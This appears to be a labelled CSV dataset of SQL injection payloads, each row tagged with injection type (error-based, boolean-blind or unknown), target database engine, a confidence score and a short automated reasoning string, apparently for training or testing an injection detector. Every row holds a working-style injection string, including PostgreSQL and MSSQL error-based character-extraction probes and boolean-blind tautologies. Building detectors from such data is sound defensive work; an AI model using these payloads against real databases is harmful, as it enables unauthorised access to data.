id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38763,1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38764,"-5863"" and ""gkvy"" = ""gkvy"" or username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38765,"select * from users WHERE username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'"" and username = ""-7962\' ) ) as pgqz where 6058 = 6058 and username = ""-7430\' ) as xfah where 1596 = 1596",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38766,"1 and username = ""1 or username = ""1\' ) ) and ( ( \'ajka\' = \'ajka",unknown,generic,0.50,Insufficient data to classify payload type,1
38767,1\'|| ( select \'yucg\' where 2576 = 2576 and ( ( \'ybgd\' = \'ybgd,unknown,generic,0.50,Insufficient data to classify payload type,1
38768,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-1254"" or username = ""1 )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38769,"-4952\' ) ) ) or username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki",unknown,generic,0.50,Insufficient data to classify payload type,1
38770,1%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
38771,-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'rxzr\' = \'rxzr,error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38772,"-4952\' ) ) ) and username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254",unknown,generic,0.50,Insufficient data to classify payload type,1
38773,"1 ) ) ) and username = ""-2756\' where 6156 = 6156 or username = ""1 ) ) ) and ( ( ( 6395 = 6395",unknown,generic,0.50,Insufficient data to classify payload type,1
38774,-1985 ) ) ) and ( ( ( 1248 = 1248,unknown,generic,0.50,Insufficient data to classify payload type,1
38775,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks"" or username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38776,"select * from users WHERE username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-7874 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38777,"select * from users WHERE username = ""-6720\' ) ) ) and ( ( ( \'enfe\' like \'enfe"" and username = ""1\' ) or username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38778,"-7874 ) ) ) and username = ""1\' ) ) ) and ( ( ( \'cbnc\' like \'cbnc",unknown,generic,0.50,Insufficient data to classify payload type,1
38779,-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap,unknown,generic,0.50,Insufficient data to classify payload type,1
38780,"select * from users WHERE username = ""-6353%\' ) ) and username = ""1\' ) ) ) or username = ""1",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38781,"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38782,"1\' ) ) ) and ( ( ( \'sbey\' = \'sbey"" or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul",unknown,generic,0.50,Insufficient data to classify payload type,1
38783,"select * from users WHERE username = ""1\' ) and ( \'izyf\' = \'izyf"" and username = ""-9263\' ) as qodg where 6798 = 6798",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38784,"select * from users WHERE username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" or username = ""-3613%\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38785,"SELECT * FROM users WHERE username = ""1\' ) where 2511 = 2511 OR username = ""-4952\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38786,"select * from users WHERE username = ""1\' ) ) and ( ( \'qtul\' like \'qtul"" and ( \'mndw\' = \'mndw"" and username = ""1\' ) where 2511 = 2511",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38787,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\' ) ) ) or username = ""-8163 ) ) as cvai where 2360 = 2360",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38788,"-9263\' ) as qodg where 6798 = 6798 and username = ""-9501\' ) and ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38789,"select * from users WHERE username = ""-1254"" and username = ""1\' ) ) ) and username = ""1\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38790,"select * from users WHERE username = ""1 ) and ( ( 8254 = 8254"" and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38791,"-4952\' ) ) ) and username = ""-9688%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38792,"select * from users WHERE username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38793,"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-3899\' ) where 8152 = 8152 and username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38794,"-2374 ) and username = ""-3424\' ) ) and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38795,"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38796,-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg,unknown,generic,0.50,Insufficient data to classify payload type,1
38797,"1 or username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks",unknown,generic,0.50,Insufficient data to classify payload type,1
38798,"select * from users WHERE username = ""1%\' ) ) ) and username = ""-9564 or username = ""-7072\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38799,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1 ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38800,"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' ) and username = ""1\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38801,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254",unknown,generic,0.50,Insufficient data to classify payload type,1
38802,"1\' ) ) ) or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
38803,"1\' ) ) and username = ""-5863"" and ( ( \'%\' = \'"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
38804,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) ) and username = ""-6353%\' ) ) and ( ( \'%\' = \'"" and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38805,"select * from users WHERE username = ""1\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) ) as plbt where 4368 = 4368",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38806,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-1254"" and username = ""1",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38807,"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38808,"-4952\' ) ) ) or username = ""-5863"" and ( ( \'%\' = \'"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
38809,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38810,"select * from users WHERE username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'stqx\' = \'stqx"" and username = ""-6353%\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38811,"select * from users WHERE username = ""1%"" and username = ""1\' ) ) and username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38812,-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38813,"select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38814,"select * from users WHERE username = ""1"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) ) and username = ""-3978",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38815,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-1190\'",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38816,"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38817,"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-4108\' ) and username = ""-9987 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38818,"select * from users WHERE username = ""-5667%\' ) ) and ( ( \'%\' = \'"" and username = ""1"" or username = ""1%\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38819,"-4248 where 3288 = 3288 and username = ""1%\' ) and ( \'%\' = \'"" and username = ""1\' ) ) and ( ( \'opyp\' = \'opyp",unknown,generic,0.50,Insufficient data to classify payload type,1
38820,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'cgiu\' = \'cgiu"" and username = ""1"" and username = ""1\' ) where 1502 = 1502",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38821,"-6190\' ) where 2621 = 2621 and username = ""1\' and username = ""-1549\' ) and ( ( 5616 = 5616",unknown,generic,0.50,Insufficient data to classify payload type,1
38822,"1 ) or username = ""1\' ) ) ) and ( ( ( \'ugoz\' = \'ugoz",unknown,generic,0.50,Insufficient data to classify payload type,1
38823,"select * from users WHERE username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-6353%\' ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38824,"select * from users WHERE username = ""-9987 ) ) ) and ( ( 8254 = 8254"" or username = ""1 ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38825,"select * from users WHERE username = ""1 ) as zmxb where 8424 = 8424 and username = ""-3978 or username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38826,-7199\' and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
38827,"-2756\' where 6156 = 6156 or username = ""1"" and ""xyjg"" = ""xyjg",unknown,generic,0.50,Insufficient data to classify payload type,1
38828,"1\' ) ) or username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38829,"-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl",unknown,generic,0.50,Insufficient data to classify payload type,1
38830,"1"" and \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38831,"select * from users WHERE username = ""1 ) or username = ""1"" or username = ""-9501\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38832,"select * from users WHERE username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38833,1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38834,"select * from users WHERE username = ""1\' ) ) and ( ( \'yhku\' like \'yhku"" and username = ""-9564",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38835,"select * from users WHERE username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-6203\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38836,"select * from users WHERE username = ""-6523"" and username = ""-7242\' and username = ""1\' in boolean mode )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38837,"select * from users WHERE username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap"" and username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38838,"-6179 ) ) or username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf",unknown,generic,0.50,Insufficient data to classify payload type,1
38839,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) ) and username = ""-3978 and username = ""1\' ) ) as wkys where 2478 = 2478",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38840,"-6353%\' ) ) and username = ""-3613%\' ) or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
38841,"select * from users WHERE username = ""1 or username = ""-5062 ) where 7457 = 7457 or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38842,-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38843,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\' ) ) as plbt where 4368 = 4368",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
